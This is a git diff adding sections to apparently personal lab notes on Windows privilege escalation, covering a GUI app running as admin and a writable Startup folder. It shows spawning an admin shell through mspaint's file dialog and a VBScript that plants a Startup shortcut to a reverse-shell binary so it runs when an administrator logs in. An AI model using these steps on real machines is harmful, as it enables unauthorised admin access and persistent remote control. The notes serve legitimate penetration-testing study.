@@ -353,7 +353,49 @@ To check for scheduled tasks on a windows system I can use the following CLI com
 
   
 ## Insecure GUI Apps
+  
+  After starting the admin-mspaint on my desktop I see that it is running as admin wiht `tasklist /V | findstr mspaint.exe`
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183256660-6167e766-f0bb-4a0a-a2fa-a51571874491.png)
+  
+  Since this GUI app is running as admin, I can use the GUI menu from within the app to run command as admin. To spawn a new shell from within paint:
+  `file://c:/windows/system32/cmd.exe`
+
+  ![image](https://user-images.githubusercontent.com/83407557/183256895-6c70940e-1f17-4546-ba53-9e1ed00fc33e.png)
+
+ Hitting enter spawns a shell as admin:
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183256942-22b9045d-2734-44f7-9c41-3de30fc12b9b.png)
+
 ## Startup Apps
+  
+  Using accesscheck I see that the startup directory is writeable:
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183257007-98687369-aff1-45c3-a102-247ccaec4742.png)
+
+  
+  The following vbs will make a shortcut to my reverse shell:
+  
+  ```vbs
+Set oWS = WScript.CreateObject("WScript.Shell")
+sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
+Set oLink = oWS.CreateShortcut(sLinkFile)
+oLink.TargetPath = "C:\users\user\desktop\reverse.exe"
+oLink.Save
+```
+  
+I can then run this vbs with cscript on the windows target:
+  
+  `cscript C:\users\user\desktop\CreateShortcut.vbs`
+  
+
+  Now, if I simulate an admin logging in, my binary will run on startup and I will get a callback on a netcat listener:
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183257418-6045bbd8-18dd-4d48-a086-fb3041b80785.png)
+
+  
 ## Token Impersonation - Rogue Potato
+  
+  
 ## Token Impersonation - PrintSpoofer
 ## Privilege Escalation Scripts
